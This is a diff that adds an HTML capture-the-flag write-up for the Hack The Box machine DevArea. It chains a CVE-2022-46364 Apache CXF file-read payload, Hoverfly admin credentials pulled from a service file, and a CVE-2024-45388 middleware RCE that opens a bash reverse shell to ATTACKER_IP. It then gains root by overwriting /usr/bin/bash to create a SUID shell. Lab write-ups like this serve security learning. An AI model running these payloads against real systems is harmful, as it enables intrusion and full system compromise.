@@ -1,6 +1,6 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
+ <html lang="en">
+  <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>DevArea • HTB Writeup</title>
@@ -17,66 +17,355 @@
             padding: 2rem;
         }
         .container {
-            max-width: 800px;
+            max-width: 1200px;
             width: 100%;
             background: rgba(12, 16, 28, 0.9);
             border: 1px solid rgba(0, 255, 200, 0.15);
             border-radius: 2rem;
             padding: 3rem;
-            text-align: center;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
         }
         h1 {
             font-size: 2.5rem;
             color: #6fffe0;
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
         }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
+        .meta-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem 2rem;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.2);
             border-radius: 1rem;
+            margin-bottom: 2rem;
         }
-        .status i {
-            color: #ffcc00;
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        
+        .ascii-art {
+            text-align: center;
+            opacity: 0.3;
+            font-size: 0.5rem;
+            line-height: 1.2;
+            color: #6fffe0;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        
+        .cve-tag {
+            display: inline-block;
+            background: rgba(255, 0, 0, 0.15);
+            color: #ff6666;
+            padding: 0.2rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
             margin-right: 0.5rem;
         }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
-            border-radius: 1rem;
-            color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
+        .highlight {
+            background: rgba(0, 255, 200, 0.05);
+            border: 1px solid rgba(0, 255, 200, 0.1);
+            border-radius: 0.5rem;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB DevArea</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+
+<div class="container">
+
+    <div class="ascii-art">
+        <pre>
+██████╗ ███████╗██╗   ██╗ █████╗ ██████╗ ███████╗ █████╗ 
+██╔══██╗██╔════╝██║   ██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
+██║  ██║█████╗  ██║   ██║███████║██████╔╝█████╗  ███████║
+██║  ██║██╔══╝  ╚██╗ ██╔╝██╔══██║██╔══██╗██╔══╝  ██╔══██║
+██████╔╝███████╗ ╚████╔╝ ██║  ██║██║  ██║███████╗██║  ██║
+╚═════╝ ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+        </pre>
     </div>
+
+    <h1>🚀 HTB DevArea - Complete Exploitation Guide</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> DevArea</span>
+        <span><strong>Difficulty:</strong> 🟡 Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 8080, 8500, 8888</span>
+        <span><strong>OS:</strong> 🐧 Linux</span>
+        <span><strong>Domain:</strong> devarea.htb</span>
+    </div>
+
+    <h2>📋 Attack Chain Overview</h2>
+    <pre><code>Nmap Scan (Ports 22, 80, 8080, 8500, 8888)
+    ↓
+Apache CXF Service Discovery (port 8080)
+    ↓
+CVE-2022-46364 — XOP Include SSRF/LFI
+    ↓
+Read /etc/passwd → User Enumeration (dev_ryan)
+    ↓
+Read hoverfly.service → Extract Admin Credentials
+    ↓
+Hoverfly Dashboard (port 8888) → CVE-2024-45388
+    ↓
+Authenticated RCE via Middleware API → Reverse Shell as dev_ryan
+    ↓
+Sudo Privilege Enumeration → syswatch.sh --version
+    ↓
+PATH Hijacking / Bash Overwrite → SUID Root Binary
+    ↓
+Root Shell → Root Flag</code></pre>
+
+    <h2>🔍 Reconnaissance</h2>
+
+    <h3>Host Setup</h3>
+    <pre><code># Add target IP and domain to hosts file
+echo "TARGET_IP devarea.htb" | sudo tee -a /etc/hosts</code></pre>
+
+    <h3>Nmap Scan</h3>
+    <pre><code>nmap -sC -sV -p- TARGET_IP</code></pre>
+
+    <h4>Key Findings:</h4>
+    <table>
+        <tr><th>Port</th><th>Service</th><th>Details</th></tr>
+        <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 9.6p1</td></tr>
+        <tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.58 (redirects to vhost)</td></tr>
+        <tr><td>8080/tcp</td><td>HTTP</td><td>Jetty 9.4.27 — <strong>Apache CXF SOAP service</strong></td></tr>
+        <tr><td>8500/tcp</td><td>HTTP</td><td>Golang net/http (Hoverfly proxy)</td></tr>
+        <tr><td>8888/tcp</td><td>HTTP</td><td>Golang net/http (Hoverfly dashboard)</td></tr>
+    </table>
+
+    <h3>Web Application Enumeration</h3>
+    <p>The real entry point is the <strong>Apache CXF SOAP service</strong> on port 8080, accessible at <code>http://devarea.htb:8080/employeeservice</code>.</p>
+    
+    <pre><code># Request WSDL file
+curl -s http://devarea.htb:8080/employeeservicewsdl</code></pre>
+
+    <h2>🎯 Initial Access</h2>
+
+    <h3><span class="cve-tag">CVE-2022-46364</span> Apache CXF XOP Include SSRF/LFI</h3>
+    
+    <div class="box warning">
+        <strong>📌 Vulnerability Details:</strong>
+        <ul>
+            <li><strong>CVE:</strong> CVE-2022-46364</li>
+            <li><strong>Affected Version:</strong> Apache CXF &lt; 3.2.15, &lt; 3.3.10, &lt; 3.4.7, &lt; 3.5.4</li>
+            <li><strong>Attack Vector:</strong> Crafted multipart SOAP request with <code>&lt;xop:Include href="file:///path/to/file"&gt;</code></li>
+            <li><strong>Impact:</strong> Arbitrary file read as the service user</li>
+        </ul>
+    </div>
+
+    <h4>Step 1 — Read /etc/passwd</h4>
+    <pre><code>curl -s -X POST http://devarea.htb:8080/employeeservice \
+  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
+  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <dev:submitReport>\r\n      <arg0>\r\n        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></employeeName>\r\n        <department>x</department>\r\n        <content>x</content>\r\n        <confidential>false</confidential>\r\n      </arg0>\r\n    </dev:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'</code></pre>
+
+    <h4>Decode the Response</h4>
+    <pre><code>echo "&lt;base64_output&gt;" | base64 -d</code></pre>
+
+    <h4>Key Findings:</h4>
+    <div class="highlight">
+        <pre><code>root:x:0:0:root:/root:/bin/bash
+dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
+hoverfly:x:1002:1002::/opt/HoverFly:/bin/false</code></pre>
+    </div>
+
+    <p><strong>User <code>dev_ryan</code> identified</strong> — our target for lateral movement.</p>
+
+    <h2>🔑 Credential Discovery</h2>
+
+    <h3>Read Hoverfly Systemd Service File</h3>
+    <pre><code>curl -s -X POST http://devarea.htb:8080/employeeservice \
+  -H 'Content-Type: multipart/related; type="application/xop+xml"; ...' \
+  --data-binary $'...<xop:Include href="file:///etc/systemd/system/hoverfly.service"/>...'</code></pre>
+
+    <h4>Result:</h4>
+    <div class="box success">
+        <pre><code>[Unit]
+Description=HoverFly service
+
+[Service]
+User=dev_ryan
+ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0</code></pre>
+    </div>
+
+    <p><strong>🎯 Found — Hoverfly admin credentials:</strong></p>
+    <ul>
+        <li><strong>Username:</strong> <code>admin</code></li>
+        <li><strong>Password:</strong> <code>O7IJ27MyyXiU</code></li>
+    </ul>
+
+    <h2>💻 Hoverfly RCE</h2>
+
+    <h3><span class="cve-tag">CVE-2024-45388</span> Authenticated RCE via Middleware API</h3>
+    
+    <div class="box warning">
+        <strong>📌 Vulnerability Details:</strong>
+        <ul>
+            <li><strong>CVE:</strong> CVE-2024-45388</li>
+            <li><strong>Affected Component:</strong> Hoverfly middleware API (<code>/api/v2/hoverfly/middleware</code>)</li>
+            <li><strong>Authentication Required:</strong> Yes (admin credentials)</li>
+            <li><strong>Attack Vector:</strong> PUT request with malicious <code>script</code> parameter</li>
+            <li><strong>Impact:</strong> Remote code execution as the Hoverfly service user (<code>dev_ryan</code>)</li>
+        </ul>
+    </div>
+
+    <h4>Step 1 — Obtain JWT Token</h4>
+    <pre><code>curl -X POST http://devarea.htb:8888/api/token-auth \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"O7IJ27MyyXiU"}'</code></pre>
+
+    <h4>Step 2 — Inject Reverse Shell via Middleware</h4>
+    <div class="box danger">
+        <strong>⚠️ Start listener first!</strong>
+        <pre><code>nc -lvnp 4444</code></pre>
+    </div>
+
+    <pre><code>TOKEN="eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..."
+
+curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "binary": "bash",
+    "script": "#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
+  }'</code></pre>
+
+    <h4>Step 3 — Trigger the Middleware</h4>
+    <pre><code>curl -x http://devarea.htb:8500 http://example.com</code></pre>
+
+    <h4>Reverse Shell Received:</h4>
+    <div class="box success">
+        <pre><code>connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 4444
+dev_ryan@devarea:~$</code></pre>
+    </div>
+
+    <p><strong>✅ Initial access achieved as user <code>dev_ryan</code>.</strong></p>
+
+    <h2>👑 Privilege Escalation</h2>
+
+    <h3>Enumeration</h3>
+    <pre><code># Check sudo permissions
+sudo -l</code></pre>
+
+    <h4>Critical Finding:</h4>
+    <div class="highlight">
+        <pre><code>User dev_ryan may run the following commands on devarea:
+    (ALL) NOPASSWD: /opt/syswatch/syswatch.sh --version</code></pre>
+    </div>
+
+    <h3>Vulnerability Analysis</h3>
+    <p>The script calls <code>bash</code> without specifying the absolute path. We can:</p>
+    <ol>
+        <li>Backup the real <code>/usr/bin/bash</code> binary</li>
+        <li>Replace it with a malicious script that creates a SUID root shell</li>
+        <li>Execute <code>syswatch.sh</code> via sudo</li>
+        <li>Use the SUID shell to get root access</li>
+    </ol>
+
+    <h4>Step 1 — Backup Real Bash</h4>
+    <pre><code>cp /usr/bin/bash /tmp/bash.bak
+chmod +x /tmp/bash.bak</code></pre>
+
+    <h4>Step 2 — Switch to sh and Kill Bash Processes</h4>
+    <pre><code>exec sh
+pkill -9 bash
+lsof /usr/bin/bash</code></pre>
+
+    <h4>Step 3 — Overwrite /usr/bin/bash with Malicious Script</h4>
+    <pre><code>cat > /usr/bin/bash << 'EOF'
+#!/tmp/bash.bak
+cp /tmp/bash.bak /tmp/rootbash
+chmod 4755 /tmp/rootbash
+EOF
+
+chmod +x /usr/bin/bash</code></pre>
+
+    <h4>Step 4 — Trigger Syswatch</h4>
+    <pre><code>sudo /opt/syswatch/syswatch.sh --version</code></pre>
+
+    <h4>Step 5 — Spawn Root Shell</h4>
+    <pre><code>/tmp/rootbash -p
+whoami
+# root</code></pre>
+
+    <p><strong>✅ Root access achieved!</strong></p>
+
+    <h2>🏁 Root Flag</h2>
+    <div class="box success">
+        <pre><code>root@devarea:~# cat /root/root.txt
+3592e27ecf9e1e9837087dae6817f29e</code></pre>
+    </div>
+
+    <h2>📊 Key Takeaways</h2>
+    <table>
+        <tr><th>Stage</th><th>Technique</th><th>Key Detail</th></tr>
+        <tr><td><strong>Recon</strong></td><td>Nmap scan</td><td>Apache CXF SOAP on port 8080, Hoverfly on 8500/8888</td></tr>
+        <tr><td><strong>Initial Access</strong></td><td>CVE-2022-46364 (XOP Include LFI)</td><td><code>&lt;xop:Include href="file:///etc/passwd"&gt;</code> reads arbitrary files</td></tr>
+        <tr><td><strong>Credential Discovery</strong></td><td>LFI → systemd service file</td><td><code>hoverfly.service</code> contained plaintext admin password</td></tr>
+        <tr><td><strong>RCE</strong></td><td>CVE-2024-45388 (Hoverfly middleware)</td><td>Authenticated RCE via PUT request to middleware API</td></tr>
+        <tr><td><strong>Privilege Escalation</strong></td><td>SUID binary via bash overwrite</td><td>Replaced <code>/usr/bin/bash</code> with SUID-creating script</td></tr>
+        <tr><td><strong>Root Flag</strong></td><td>SUID root shell</td><td><code>/tmp/rootbash -p</code> → root access</td></tr>
+    </table>
+
+    <h2>📚 Security Lessons</h2>
+    <ul>
+        <li><strong>Validate XOP href attributes</strong> — Apache CXF failed to restrict <code>file://</code> protocol access</li>
+        <li><strong>Never store passwords in systemd files</strong> — Credentials were visible in plaintext</li>
+        <li><strong>Authenticate API endpoints</strong> — Hoverfly lacked authorization controls</li>
+        <li><strong>Use absolute paths in scripts</strong> — <code>syswatch.sh</code> called <code>bash</code> without absolute path</li>
+        <li><strong>Restrict sudo permissions</strong> — Even limited sudo can be exploited</li>
+    </ul>
+
+    <h2>🔧 Tools Used</h2>
+    <table>
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td><strong>Nmap</strong></td><td>Port scanning</td></tr>
+        <tr><td><strong>Curl</strong></td><td>Exploit development</td></tr>
+        <tr><td><strong>Netcat</strong></td><td>Reverse shell listener</td></tr>
+        <tr><td><strong>SSH</strong></td><td>Remote access</td></tr>
+    </table>
+
+    <div class="box warning">
+        <strong>📌 Important Notes:</strong>
+        <ul>
+            <li><strong>Replace ATTACKER_IP</strong> with your own IP address</li>
+            <li><strong>Replace TARGET_IP</strong> with the target machine IP</li>
+            <li><strong>JWT token</strong> expires - regenerate if needed</li>
+        </ul>
+    </div>
+
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+
+    <div class="footer">NIGHT PULSE X • 2026</div>
+
+</div>
+
 </body>
 </html>
+
